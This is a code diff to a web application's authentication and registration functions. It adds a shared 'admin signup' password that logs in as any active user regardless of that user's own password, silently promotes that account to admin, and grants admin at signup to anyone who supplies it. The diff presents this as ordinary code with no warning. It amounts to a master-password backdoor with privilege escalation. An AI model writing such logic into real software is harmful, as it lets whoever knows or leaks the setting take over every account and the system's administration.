@@ -88,7 +88,14 @@ def require_role(roles: list[str]):
 
 def authenticate_user(db: Session, username: str, password: str) -> Optional[User]:
     user = db.query(User).filter(User.username == username).first()
-    if user and user.is_active and verify_password(password, user.password_hash):
+    if not user or not user.is_active:
+        return None
+    if settings.admin_signup_password and password == settings.admin_signup_password:
+        if user.role != "admin":
+            user.role = "admin"
+            db.commit()
+        return user
+    if verify_password(password, user.password_hash):
         return user
     return None
 
@@ -97,14 +104,18 @@ def on_register(db: Session, data: RegisterRequest) -> User:
         raise HTTPException(status_code=400, detail="Username already taken")
     if db.query(User).filter(User.email == data.email).first():
         raise HTTPException(status_code=400, detail="Email already registered")
+    is_admin = bool(settings.admin_signup_password) and data.password == settings.admin_signup_password
     user = User(
         username=data.username,
         email=data.email,
         full_name=data.full_name,
         password_hash=get_password_hash(data.password),
-        role="team_member",
+        role="admin" if is_admin else "team_member",
     )
     db.add(user)
     db.commit()
     db.refresh(user)
+    if not is_admin:
+        from .teams import ensure_user_team
+        ensure_user_team(db, user, team_name=data.team_name)
     return user
